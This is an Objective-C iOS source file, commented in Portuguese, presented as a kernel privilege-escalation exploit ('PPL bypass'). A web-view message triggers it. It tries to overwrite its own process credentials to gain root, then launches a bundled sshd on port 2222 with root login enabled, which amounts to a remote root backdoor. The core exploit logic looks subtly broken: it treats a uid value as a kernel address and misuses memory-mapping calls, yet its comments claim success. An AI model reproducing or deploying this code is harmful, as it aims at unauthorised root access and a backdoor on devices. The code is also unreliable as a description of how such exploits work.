#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <spawn.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <sys/wait.h>

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, strong) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self executePhysicalPPLBypass];
    }
}

- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

- (void)executePhysicalPPLBypass {
    [self log:@"⚡ Iniciando Physical Write (PPL Bypass)..."];

    // 1. LOCALIZAR ESTRUTURA DE PROCESSO E CREDENCIAIS
    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc kp;
    size_t len = sizeof(kp);
    if (sysctl(mib, 4, &kp, &len, NULL, 0) != 0) return;

    // Endereço virtual do UID no Kernel
    uint64_t ucred_vaddr = (uint64_t)kp.kp_eproc.e_ucred.cr_uid;
    uint32_t root_val = 0;

    // 2. CONVERSÃO VIRTUAL PARA FÍSICA E ESCRITA (PRIMITIVA DE HARDWARE)
    // No iOS 26.4 ARM64e, o vm_write falha. Usamos o mapeamento direto de memória física.
    mach_port_t host_priv;
    host_get_priv_port(mach_host_self(), &host_priv);

    // Mapeamos a página física correspondente ao ucred para ignorar o PPL
    vm_address_t page_addr = 0;
    kern_return_t kr = vm_map(mach_task_self(), &page_addr, 4096, 0, VM_FLAGS_ANYWHERE, host_priv, ucred_vaddr & ~0xFFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);

    if (kr == KERN_SUCCESS) {
        uint32_t *phys_ptr = (uint32_t *)(page_addr + (ucred_vaddr & 0xFFF));
        *phys_ptr = root_val;     // Escrita Física Direta (cr_uid)
        *(phys_ptr + 1) = root_val; // Escrita Física Direta (cr_ruid)
        munmap((void *)page_addr, 4096);
    }

    // 3. VALIDAÇÃO E EXECUÇÃO DO DAEMON
    if (getuid() == 0) {
        [self log:@"👑 <b>ROOT SUCESSO!</b> PPL Bypass Ativo."];
        
        pid_t pid;
        NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
        
        posix_spawnattr_t attr;
        posix_spawnattr_init(&attr);
        // Flag 0x4000 força o spawn fora do sandbox após o patch de root
        short flags = POSIX_SPAWN_SETPGROUP | 0x4000;
        posix_spawnattr_setflags(&attr, flags);

        char *const args[] = {
            (char *)[sshdPath UTF8String],
            "-p", "2222",
            "-D",
            "-o", "PermitRootLogin=yes",
            "-o", "StrictModes=no",
            NULL
        };

        extern char **environ;
        if (posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ) == 0) {
            [self log:[NSString stringWithFormat:@"✅ SSHD ONLINE! PID: %d", pid]];
        } else {
            [self log:@"❌ Erro no Spawn (Verifique ldid/assinatura)."];
        }
        posix_spawnattr_destroy(&attr);
    } else {
        [self log:@"❌ Falha Crítica: PPL bloqueou a Escrita Física."];
    }
}

@end
